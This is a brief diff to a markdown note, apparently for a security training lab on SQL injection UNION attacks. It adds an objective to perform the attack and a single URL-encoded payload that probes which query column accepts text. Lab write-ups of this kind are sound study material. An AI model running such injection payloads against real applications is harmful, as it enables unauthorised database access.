@@ -1,4 +1,9 @@
 # Lab: SQL injection UNION attack, finding a column containing text
 
 ## Objective
-Document solution and notes here.
+Perform the attack to solve SQL injection UNION attack, finding a column containing text.
+
+## Payload
+```text
+'+UNION+SELECT+'abc',NULL--
+```
